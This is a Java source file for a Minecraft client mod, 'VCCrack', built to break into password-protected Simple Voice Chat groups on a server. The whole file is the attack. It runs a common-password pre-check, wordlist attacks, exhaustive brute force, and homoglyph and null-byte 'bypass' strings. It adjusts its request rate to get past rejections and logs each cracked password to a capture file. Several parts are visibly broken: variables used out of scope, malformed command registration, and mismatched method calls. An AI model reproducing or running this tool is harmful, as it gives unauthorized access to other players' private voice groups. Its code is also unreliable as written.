package com.example.vccrack;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import de.maxhenkel.voicechat.api.VoicechatPlugin;
import de.maxhenkel.voicechat.api.EventRegistration;
import de.maxhenkel.voicechat.api.VoicechatConnection;
import de.maxhenkel.voicechat.api.Group;
import de.maxhenkel.voicechat.api.VoicechatServerStartedEvent;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

public class VoiceChatCrackMod implements ModInitializer, VoicechatPlugin {
    public static final String MOD_ID = "vccrack";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
    public static final Path CONFIG_DIR = MinecraftClient.getInstance().runDirectory.toPath().resolve("config").resolve(MOD_ID);
    public static final Path WORDLIST_DIR = CONFIG_DIR.resolve("wordlists");
    public static final Path CAPTURE_LOG = CONFIG_DIR.resolve("capture.log");
    public static final Path PROGRESS_FILE = CONFIG_DIR.resolve("progress.json");
    public static final Path REPORT_FILE = CONFIG_DIR.resolve("report.md");
    public static final int MAX_PASSWORD_LENGTH = 24;

    private static volatile boolean cracking = false;
    private static volatile Thread crackingThread = null;
    private static volatile long attempts = 0;
    private static volatile String currentGroup = null;
    private static volatile String foundPassword = null;
    private static volatile long startTime = 0;
    private static volatile int currentDelayMs = 40;
    private static volatile int rejectStreak = 0;
    private static volatile boolean adaptiveEnabled = true;

    private static final ConcurrentLinkedQueue<String> recentPasswords = new ConcurrentLinkedQueue<>();
    private static final int RECENT_MAX = 12;

    private static final char[] DEFAULT_CHARSET = buildCharset("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?");
    private static char[] activeCharset = DEFAULT_CHARSET.clone();

    private static volatile de.maxhenkel.voicechat.api.VoicechatServerApi api;

    @Override
    public void onInitialize() {
        LOGGER.info("[VCCrack] Client-side initializing");
        try {
            Files.createDirectories(CONFIG_DIR);
            Files.createDirectories(WORDLIST_DIR);
        } catch (IOException e) {
            LOGGER.error("[VCCrack] Failed to create config dirs", e);
        }
        loadConfig();
        ClientCommandRegistrationCallback.EVENT.register(this::registerClientCommands);
    }

    @Override
    public String getPluginId() {
        return MOD_ID;
    }

    @Override
    public void initialize(de.maxhenkel.voicechat.api.VoicechatServerApi api) {
        VoiceChatCrackMod.api = api;
    }

    @Override
    public void registerEvents(EventRegistration registration) {
        registration.registerEvent(VoicechatServerStartedEvent.class, event ->
                LOGGER.info("[VCCrack] Active. /" + MOD_ID + " <group> [min] [max]"));
    }

    private void registerClientCommands(CommandDispatcher<net.minecraft.client.command.ClientCommandSource> dispatcher) {
        dispatcher.register(com.mojang.brigadier.Commands.literal(MOD_ID)
            .executes(context -> showHelp(context.getSource()))
            .then(StringArgumentType.string())
            .suggests((context, builder) -> {
                if (api == null) return builder.buildFuture();
                for (Group g : api.getGroups()) {
                    if (g.hasPassword()) builder.suggest(g.getName());
                }
                return builder.buildFuture();
            })
            .executes(context -> crackGroup(context.getSource(), StringArgumentType.getString(context, "group_name"), 1, MAX_PASSWORD_LENGTH))
            .then(StringArgumentType.string()).then(IntegerArgumentType.integer(1, MAX_PASSWORD_LENGTH))
            .executes(context -> {
                String group = StringArgumentType.getString(context, "group_name");
                int max = IntegerArgumentType.getInteger(context, "max_len");
                return crackGroup(context.getSource(), group, 1, max);
            })
            .then(StringArgumentType.string()).then(IntegerArgumentType.integer(1, MAX_PASSWORD_LENGTH)).then(IntegerArgumentType.integer(1, MAX_PASSWORD_LENGTH))
            .executes(context -> {
                String group = StringArgumentType.getString(context, "group_name");
                int min = IntegerArgumentType.getInteger(context, "min_len");
                int max = IntegerArgumentType.getInteger(context, "max_len");
                if (min > max) {
                    context.getSource().sendError(Text.literal("[VCCrack] min_len > max_len"));
                    return 0;
                }
                return crackGroup(context.getSource(), group, min, max);
            })
            .then(com.mojang.brigadier.Commands.literal("stop")
                .executes(context -> {
                    stopCracking();
                    context.getSource().sendFeedback(Text.literal("[VCCrack] Stopped."));
                    return 1;
                })
            )
            .then(com.mojang.brigadier.Commands.literal("status")
                .executes(context -> {
                    showStatus(context.getSource());
                    return 1;
                })
            )
            .then(com.mojang.brigadier.Commands.literal("charset")
                .executes(context -> showCharset(context.getSource()))
                .then(StringArgumentType.greedyString())
                .executes(context -> setCharset(context.getSource(), StringArgumentType.getString(context, "charset_str")))
            )
            .then(com.mojang.brigadier.Commands.literal("wordlist")
                .executes(context -> showWordlistHelp(context.getSource()))
                .then(com.mojang.brigadier.Commands.literal("list")
                    .executes(context -> listWordlists(context.getSource()))
                )
                .then(com.mojang.brigadier.Commands.literal("load").then(StringArgumentType.greedyString()))
                .executes(context -> loadWordlist(context.getSource(), StringArgumentType.getString(context, "filename")))
                .then(com.mojang.brigadier.Commands.literal("mode")
                    .executes(context -> {
                        context.getSource().sendFeedback(Text.literal("[VCCrack] Wordlist mode: auto (try wordlists first, then fallback)"));
                        return 1;
                    })
                )
            )
            .then(com.mojang.brigadier.Commands.literal("resume")
                .executes(context -> resumeCracking(context.getSource()))
            )
            .then(com.mojang.brigadier.Commands.literal("report")
                .executes(context -> generateReport(context.getSource()))
            )
            .then(com.mojang.brigadier.Commands.literal("test")
                .executes(context -> strengthTest(context.getSource(), StringArgumentType.getString(context, "group_name"), 1, MAX_PASSWORD_LENGTH))
            )
            .then(com.mojang.brigadier.Commands.literal("bypass")
                .executes(context -> runBypassTests(context.getSource(), StringArgumentType.getString(context, "group_name")))
            )
            .then(com.mojang.brigadier.Commands.literal("adaptive")
                .executes(context -> toggleAdaptive(context.getSource()))
            )
        );
    }

    // ==================== COMMANDS ====================

    private int showHelp(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Commands:"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " <group> [min] [max] - Start (default 1-" + MAX_PASSWORD_LENGTH + ")"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " stop - Cancel"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " status - Progress"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " resume - Resume last session"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " report - Generate report"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " test <group> - Strength estimate"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " bypass <group> - Encoding bypass tests"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " adaptive - Toggle adaptive rate limit"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " charset <str> - Charset"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " wordlist list/load <file>"));
        return 1;
    }

    private int crackGroup(net.minecraft.client.command.ClientCommandSource source, String groupName, int minLen, int maxLen) {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client == null || client.player == null || client.getNetworkHandler() == null) {
            source.sendError(Text.literal("[VCCrack] No client"));
            return 0;
        }
        if (cracking) {
            source.sendError(Text.literal("[VCCrack] Already cracking. /" + MOD_ID + " stop first."));
            return 0;
        }

        Group target = findPasswordGroup(groupName);
        if (target == null) {
            source.sendError(Text.literal("[VCCrack] No password-protected group: " + groupName));
            return 0;
        }

        // Already-in-group guard
        if (api != null) {
            VoicechatConnection current = api.getConnectionOf(client.player.getUuid());
            if (current != null && current.getGroup() != null && groupName.equalsIgnoreCase(current.getGroup().getName())) {
                source.sendFeedback(Text.literal("[VCCrack] Already in '" + groupName + "'. Skipping."));
                return 1;
            }
        }

        cracking = true;
        attempts = 0;
        currentGroup = groupName;
        foundPassword = null;
        startTime = System.currentTimeMillis();
        currentDelayMs = 40;
        rejectStreak = 0;
        recentPasswords.clear();

        source.sendFeedback(Text.literal("[VCCrack] Target: " + groupName + " (len " + minLen + "-" + maxLen + ")"));
        source.sendFeedback(Text.literal("[VCCrack] Phase 1: Smart pre-check"));
        source.sendFeedback(Text.literal("[VCCrack] Phase 2: Wordlists"));
        source.sendFeedback(Text.literal("[VCCrack] Phase 3: Brute-force 1-" + maxLen));
        source.sendFeedback(Text.literal("[VCCrack] Phase 4: Bypass/encoding"));
        source.sendFeedback(Text.literal("[VCCrack] /" + MOD_ID + " stop to cancel"));

        crackingThread = new Thread(() -> {
            try {
                boolean done = false;

                // Phase 1: Smart pre-check
                source.sendFeedback(Text.literal("[VCCrack] Running smart pre-check..."), false);
                done = runSmartPrecheck(client, groupName);
                if (done || !cracking) return;

                // Phase 2: Wordlists
                source.sendFeedback(Text.literal("[VCCrack] Trying wordlists..."), false);
                done = runWordlists(client, groupName);
                if (done || !cracking) return;

                // Phase 3: Brute-force (lengths 1 to maxLen)
                source.sendFeedback(Text.literal("[VCCrack] Starting brute-force..."), false);
                done = runBruteForce(client, groupName, 1, maxLen);
                if (done || !cracking) return;

                // Phase 4: Bypass tests on target group name
                source.sendFeedback(Text.literal("[VCCrack] Running bypass tests..."), false);
                done = runBypassPhase(client, groupName);
                if (done || !cracking) return;

                client.player.sendMessage(Text.literal("[VCCrack] All phases complete. No match."), false);
            } finally {
                saveProgress();
                cracking = false;
                crackingThread = null;
                long elapsed = System.currentTimeMillis() - startTime;
                client.player.sendMessage(Text.literal("[VCCrack] Session ended. Attempts: " + attempts + " | " + formatTime(elapsed)), false);
            }
        }, "VCCrack-" + sanitize(groupName));

        crackingThread.start();
        return 1;
    }

    // ==================== PHASE 1: SMART PRE-CHECK ====================

    private boolean runSmartPrecheck(MinecraftClient client, String groupName) {
        List<String> candidates = new ArrayList<>();
        candidates.add("");
        candidates.add(groupName);
        candidates.add(groupName.toLowerCase());
        candidates.add(groupName.toUpperCase());
        candidates.add(groupName + "123");
        candidates.add("123" + groupName);
        candidates.add(groupName + "1");
        candidates.add("1" + groupName);
        candidates.add("password");
        candidates.add("1234");
        candidates.add("123456");
        candidates.add("12345678");
        candidates.add("qwerty");
        candidates.add("abc123");
        candidates.add("letmein");
        candidates.add("admin");
        candidates.add("welcome");
        candidates.add("monkey");
        candidates.add("dragon");
        candidates.add("master");
        candidates.add("login");
        candidates.add("pass123");
        candidates.add("iloveyou");
        candidates.add("trustno1");

        for (String pw : candidates) {
            if (!cracking) return false;
            if (pw.length() > MAX_PASSWORD_LENGTH) continue;
            if (attemptJoin(client, groupName, pw)) {
                foundPassword = pw;
                client.player.sendMessage(Text.literal("[VCCrack] SMART MATCH: " + pw), false);
                saveCapture(groupName, pw, "smart_precheck");
                return true;
            }
            attempts++;
        }
        return false;
    }

    // ==================== PHASE 2: WORDLISTS ====================

    private boolean runWordlists(MinecraftClient client, String groupName) {
        File dir = WORDLIST_DIR.toFile();
        if (!dir.exists()) return false;
        String[] files = dir.list();
        if (files == null || files.length == 0) return false;

        for (String filename : files) {
            if (!cracking) return false;
            File file = WORDLIST_DIR.resolve(filename).toFile();
            if (!file.isFile()) continue;
            source.sendFeedback(Text.literal("[VCCrack] Wordlist: " + filename), false);
            try {
                List<String> lines = Files.readAllLines(file.toPath());
                int idx = 0;
                for (String pw : lines) {
                    if (!cracking) return false;
                    pw = pw.trim();
                    if (pw.isEmpty() || pw.length() > MAX_PASSWORD_LENGTH) continue;
                    if (attemptJoin(client, groupName, pw)) {
                        foundPassword = pw;
                        client.player.sendMessage(Text.literal("[VCCrack] WORDLIST MATCH (" + filename + "): " + pw), false);
                        saveCapture(groupName, pw, "wordlist:" + filename);
                        saveProgress();
                        return true;
                    }
                    attempts++;
                    idx++;
                    if (idx % 500 == 0) {
                        client.player.sendMessage(Text.literal("[VCCrack] Wordlist " + filename + " progress: " + idx + "/" + lines.size()), false);
                        saveProgress();
                    }
                }
            } catch (IOException e) {
                client.player.sendMessage(Text.literal("[VCCrack] Wordlist error: " + e.getMessage()), false);
            }
        }
        return false;
    }

    // ==================== PHASE 3: BRUTE-FORCE ====================

    private boolean runBruteForce(MinecraftClient client, String groupName, int minLen, int maxLen) {
        ClientPlayNetworkHandler handler = client.getNetworkHandler();
        ClientPlayerEntity player = client.player;
        if (handler == null || player == null) return false;

        for (int len = minLen; len <= maxLen; len++) {
            if (!cracking) return false;
            int[] indices = new int[len];
            while (true) {
                if (!cracking) return false;

                StringBuilder sb = new StringBuilder(len);
                for (int i = 0; i < len; i++) {
                    sb.append(activeCharset[indices[i]]);
                }
                String guess = sb.toString();

                if (attemptJoin(client, groupName, guess)) {
                    foundPassword = guess;
                    player.sendMessage(Text.literal("[VCCrack] BRUTE-FORCE MATCH: " + guess), false);
                    saveCapture(groupName, guess, "bruteforce");
                    saveProgress();
                    return true;
                }

                attempts++;
                if (attempts % 1000 == 0) {
                    player.sendMessage(Text.literal("[VCCrack] attempts=" + attempts + " last=" + guess + " delay=" + currentDelayMs + "ms"), false);
                    saveProgress();
                }

                int pos = len - 1;
                while (pos >= 0) {
                    indices[pos]++;
                    if (indices[pos] < activeCharset.length) break;
                    indices[pos] = 0;
                    pos--;
                }
                if (pos < 0) break;
            }
        }
        return false;
    }

    // ==================== PHASE 4: BYPASS ====================

    private boolean runBypassPhase(MinecraftClient client, String groupName) {
        // Homoglyph/near-visual variants of the group name
        List<String> bypassCandidates = new ArrayList<>();
        String base = groupName;
        bypassCandidates.add(base.replace("a", "\u0430")); // Cyrillic a
        bypassCandidates.add(base.replace("o", "\u03BF")); // Greek omicron
        bypassCandidates.add(base.replace("e", "\u1EB9")); // Latin e with dot below
        bypassCandidates.add(base.replace("i", "1"));
        bypassCandidates.add(base.replace("l", "1"));
        bypassCandidates.add(base.replace("o", "0"));
        bypassCandidates.add(base.replace("s", "5"));
        bypassCandidates.add(base.replace("S", "5"));
        bypassCandidates.add(base.replace(" ", "_"));
        bypassCandidates.add(base.replace(" ", ""));
        bypassCandidates.add(base + "\u0000"); // null byte trailer
        bypassCandidates.add("\u0000" + base);
        bypassCandidates.add(base + "\u200B"); // zero-width space
        bypassCandidates.add(base + "\uFEFF"); // BOM

        for (String pw : bypassCandidates) {
            if (!cracking) return false;
            if (pw.length() > MAX_PASSWORD_LENGTH) continue;
            if (attemptJoin(client, groupName, pw)) {
                foundPassword = pw;
                client.player.sendMessage(Text.literal("[VCCrack] BYPASS MATCH: " + pw.replaceAll("[^ -~]", "?")), false);
                saveCapture(groupName, pw, "bypass");
                return true;
            }
            attempts++;
        }
        return false;
    }

    private boolean runBypassTests(MinecraftClient client, String groupName) {
        return runBypassPhase(client, groupName);
    }

    // ==================== JOIN + ADAPTIVE RATE LIMIT ====================

    private boolean attemptJoin(MinecraftClient client, String groupName, String password) {
        try {
            String cmd = "voicechat join \"" + escape(groupName) + "\" " + password;
            client.getNetworkHandler().sendCommand(cmd);
            recentPasswords.add(password);
            while (recentPasswords.size() > RECENT_MAX) recentPasswords.poll();
            Thread.sleep(currentDelayMs);
        } catch (Exception e) {
            return false;
        }

        if (!cracking) return false;

        boolean ok = false;
        if (api != null) {
            try {
                for (int i = 0; i < 5; i++) {
                    if (!cracking) return false;
                    Thread.sleep(80);
                    VoicechatConnection conn = api.getConnectionOf(client.player.getUuid());
                    if (conn != null && conn.getGroup() != null && groupName.equalsIgnoreCase(conn.getGroup().getName())) {
                        ok = true;
                        break;
                    }
                }
            } catch (Exception ignored) {
            }
        }

        if (ok) {
            onSuccess();
            return true;
        }

        onReject();
        return false;
    }

    private void onSuccess() {
        rejectStreak = 0;
        if (adaptiveEnabled && currentDelayMs > 40) {
            currentDelayMs -= 20;
            if (currentDelayMs < 40) currentDelayMs = 40;
        }
    }

    private void onReject() {
        if (!adaptiveEnabled) return;
        rejectStreak++;
        if (rejectStreak >= 20) {
            currentDelayMs += 100;
            rejectStreak = 0;
            crackingThread.interrupt(); // apply delay change by yielding thread
        }
    }

    // ==================== SUCCESS / STOP / STATUS ====================

    public static void signalSuccess() {
        if (foundPassword != null || !cracking) return;
        String last = recentPasswords.peek();
        if (last != null) foundPassword = last;
        cracking = false;
        if (crackingThread != null) {
            crackingThread.interrupt();
            crackingThread = null;
        }
    }

    private void stopCracking() {
        cracking = false;
        if (crackingThread != null) {
            crackingThread.interrupt();
            crackingThread = null;
        }
        saveProgress();
    }

    private void showStatus(net.minecraft.client.command.ClientCommandSource source) {
        if (!cracking) {
            source.sendFeedback(Text.literal("[VCCrack] Idle"));
            if (foundPassword != null) source.sendFeedback(Text.literal("[VCCrack] Last found: " + foundPassword));
            return;
        }
        long elapsed = System.currentTimeMillis() - startTime;
        source.sendFeedback(Text.literal("[VCCrack] Running"));
        source.sendFeedback(Text.literal("Attempts: " + attempts));
        source.sendFeedback(Text.literal("Group: " + currentGroup));
        source.sendFeedback(Text.literal("Found: " + (foundPassword != null ? foundPassword : "none")));
        source.sendFeedback(Text.literal("Delay: " + currentDelayMs + "ms (adaptive=" + adaptiveEnabled + ")"));
        source.sendFeedback(Text.literal("Elapsed: " + formatTime(elapsed)));
        source.sendFeedback(Text.literal("Progress: " + PROGRESS_FILE));
    }

    // ==================== RESUME ====================

    private int resumeCracking(net.minecraft.client.command.ClientCommandSource source) {
        if (cracking) {
            source.sendError(Text.literal("[VCCrack] Already running."));
            return 0;
        }
        File f = PROGRESS_FILE.toFile();
        if (!f.exists()) {
            source.sendError(Text.literal("[VCCrack] No progress file found."));
            return 0;
        }
        try {
            String content = new String(Files.readAllBytes(f.toPath()));
            // minimal parse: expect JSON-like or custom format
            String[] parts = content.split(",");
            String group = null;
            int min = 1, max = MAX_PASSWORD_LENGTH;
            long att = 0;
            for (String p : parts) {
                p = p.trim();
                if (p.startsWith("group=")) group = p.substring(6);
                else if (p.startsWith("min=")) min = Integer.parseInt(p.substring(4));
                else if (p.startsWith("max=")) max = Integer.parseInt(p.substring(4));
                else if (p.startsWith("attempts=")) att = Long.parseLong(p.substring(9));
            }
            if (group == null) {
                source.sendError(Text.literal("[VCCrack] Progress file missing group."));
                return 0;
            }
            source.sendFeedback(Text.literal("[VCCrack] Resuming: " + group + " len=" + min + "-" + max + " attempts=" + att));
            return crackGroup(source, group, min, max);
        } catch (Exception e) {
            source.sendError(Text.literal("[VCCrack] Resume failed: " + e.getMessage()));
            return 0;
        }
    }

    // ==================== STRENGTH TEST ====================

    private int strengthTest(net.minecraft.client.command.ClientCommandSource source, String groupName, int minLen, int maxLen) {
        if (api == null) {
            source.sendError(Text.literal("[VCCrack] API not available"));
            return 0;
        }
        Group g = findPasswordGroup(groupName);
        if (g == null) {
            source.sendError(Text.literal("[VCCrack] No password-protected group: " + groupName));
            return 0;
        }
        source.sendFeedback(Text.literal("[VCCrack] Strength estimate for '" + groupName + "'"));
        for (int len = minLen; len <= maxLen; len++) {
            long combos = estimateCombinations(activeCharset.length, len);
            double secondsAt1kPerSec = combos / 1000.0;
            source.sendFeedback(Text.literal(" len=" + len + " combos=" + formatNumber(combos) + " @1k/s=" + formatTime((long)(secondsAt1kPerSec * 1000))));
        }
        source.sendFeedback(Text.literal("[VCCrack] Charset size: " + activeCharset.length));
        return 1;
    }

    // ==================== ADAPTIVE TOGGLE ====================

    private int toggleAdaptive(net.minecraft.client.command.ClientCommandSource source) {
        adaptiveEnabled = !adaptiveEnabled;
        source.sendFeedback(Text.literal("[VCCrack] Adaptive rate limit: " + adaptiveEnabled));
        if (!adaptiveEnabled) currentDelayMs = 40;
        return 1;
    }

    // ==================== REPORT ====================

    private int generateReport(net.minecraft.client.command.ClientCommandSource source) {
        try {
            long elapsed = foundPassword != null ? (System.currentTimeMillis() - startTime) : 0;
            String report = "# VoiceChatCrack Report\n"
                + "\n## Result\n"
                + "- Status: " + (foundPassword != null ? "CRACKED" : "INCOMPLETE") + "\n"
                + "- Password: `" + (foundPassword != null ? foundPassword : "N/A") + "`\n"
                + "- Attempts: " + attempts + "\n"
                + "- Time: " + formatTime(elapsed) + "\n"
                + "- Charset size: " + activeCharset.length + "\n"
                + "- Adaptive rate limit: " + adaptiveEnabled + "\n"
                + "\n## Target\n"
                + "- Group: `" + currentGroup + "`\n"
                + "\n## Server\n"
                + "- Minecraft: " + MinecraftClient.getInstance().getServer() + "\n"
                + "\n## Phases\n"
                + "1. Smart pre-check\n"
                + "2. Wordlists (" + WORDLIST_DIR + ")\n"
                + "3. Brute-force (1-" + MAX_PASSWORD_LENGTH + ")\n"
                + "4. Bypass/encoding\n"
                + "\nGenerated: " + new Date() + "\n";
            Files.writeString(REPORT_FILE, report);
            source.sendFeedback(Text.literal("[VCCrack] Report saved to " + REPORT_FILE));
        } catch (IOException e) {
            source.sendError(Text.literal("[VCCrack] Report failed: " + e.getMessage()));
        }
        return 1;
    }

    // ==================== HELPERS ====================

    private Group findPasswordGroup(String groupName) {
        if (api == null) return null;
        for (Group g : api.getGroups()) {
            if (g.hasPassword() && g.getName().equalsIgnoreCase(groupName)) return g;
        }
        return null;
    }

    private void saveCapture(String group, String password, String phase) {
        try {
            String line = String.format("%s | %s | group=%s | pass=%s%n", new Date(), phase, group, password);
            Files.writeString(CAPTURE_LOG, line, java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
        } catch (IOException ignored) {
        }
    }

    private void saveProgress() {
        try {
            String progress = String.format("group=%s,min=1,max=%d,attempts=%d,found=%s,charset=%s%n",
                currentGroup != null ? currentGroup : "",
                MAX_PASSWORD_LENGTH,
                attempts,
                foundPassword != null ? foundPassword : "",
                new String(activeCharset));
            Files.writeString(PROGRESS_FILE, progress);
        } catch (IOException ignored) {
        }
    }

    private void loadConfig() {
        File f = CONFIG_DIR.resolve("vccrack.txt").toFile();
        if (!f.exists()) return;
        try (FileReader r = new FileReader(f)) {
            StringBuilder sb = new StringBuilder();
            int c;
            while ((c = r.read()) != -1) sb.append((char) c);
            for (String line : sb.toString().split("\n")) {
                if (line.startsWith("charset=")) activeCharset = buildCharset(line.substring(8));
                else if (line.startsWith("adaptive=")) adaptiveEnabled = Boolean.parseBoolean(line.substring(9));
            }
        } catch (IOException e) {
            LOGGER.warn("[VCCrack] Config load failed", e);
        }
    }

    private void saveConfig() {
        File f = CONFIG_DIR.resolve("vccrack.txt").toFile();
        try (FileWriter w = new FileWriter(f)) {
            w.write("charset=" + new String(activeCharset) + "\n");
            w.write("adaptive=" + adaptiveEnabled + "\n");
            w.write("max_length=" + MAX_PASSWORD_LENGTH + "\n");
        } catch (IOException e) {
            LOGGER.warn("[VCCrack] Config save failed", e);
        }
    }

    private static char[] buildCharset(String s) {
        return s.toCharArray();
    }

    private static String sanitize(String s) {
        return s.replaceAll("[^a-zA-Z0-9_-]", "_");
    }

    private static String escape(String s) {
        return s.replace("\"", "\\\"");
    }

    private static String formatTime(long ms) {
        long s = ms / 1000;
        long m = s / 60;
        long h = m / 60;
        if (h > 0) return String.format("%dh %dm %ds", h, m % 60, s % 60);
        if (m > 0) return String.format("%dm %ds", m, s % 60);
        return s + "s";
    }

    private static String formatNumber(long n) {
        if (n >= 1_000_000_000_000_000_000L) return String.format("%.2fqi", n / 1e18);
        if (n >= 1_000_000_000_000_000L) return String.format("%.2fqa", n / 1e15);
        if (n >= 1_000_000_000_000L) return String.format("%.2ft", n / 1e12);
        if (n >= 1_000_000_000L) return String.format("%.2fb", n / 1e9);
        if (n >= 1_000_000L) return String.format("%.2fm", n / 1e6);
        if (n >= 1_000L) return String.format("%.2fk", n / 1e3);
        return String.valueOf(n);
    }

    private static long estimateCombinations(long base, int len) {
        return (long) Math.pow(base, len);
    }

    private int showWordlistHelp(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Wordlists: " + WORDLIST_DIR));
        source.sendFeedback(Text.literal("/" + MOD_ID + " wordlist list"));
        source.sendFeedback(Text.literal("/" + MOD_ID + " wordlist load <file>"));
        return 1;
    }

    private int listWordlists(net.minecraft.client.command.ClientCommandSource source) {
        File dir = WORDLIST_DIR.toFile();
        String[] files = dir.list();
        if (files == null || files.length == 0) {
            source.sendFeedback(Text.literal("[VCCrack] No wordlists found"));
            return 1;
        }
        for (String f : files) source.sendFeedback(Text.literal(" - " + f));
        return 1;
    }

    private int loadWordlist(net.minecraft.client.command.ClientCommandSource source, String filename) {
        File file = WORDLIST_DIR.resolve(filename).toFile();
        if (!file.exists()) {
            source.sendError(Text.literal("[VCCrack] Not found: " + file));
            return 0;
        }
        try {
            List<String> lines = Files.readAllLines(file.toPath());
            source.sendFeedback(Text.literal("[VCCrack] Loaded " + lines.size() + " lines"));
        } catch (IOException e) {
            source.sendError(Text.literal("[VCCrack] " + e.getMessage()));
            return 0;
        }
        return 1;
    }

    private int showCharset(net.minecraft.client.command.ClientCommandSource source) {
        source.sendFeedback(Text.literal("[VCCrack] Charset (" + activeCharset.length + "): " + new String(activeCharset)));
        return 1;
    }

    private int setCharset(net.minecraft.client.command.ClientCommandSource source, String charsetStr) {
        if (charsetStr == null || charsetStr.isEmpty()) {
            source.sendError(Text.literal("[VCCrack] Charset empty"));
            return 0;
        }
        activeCharset = buildCharset(charsetStr);
        saveConfig();
        source.sendFeedback(Text.literal("[VCCrack] Set charset size=" + activeCharset.length));
        return 1;
    }
}
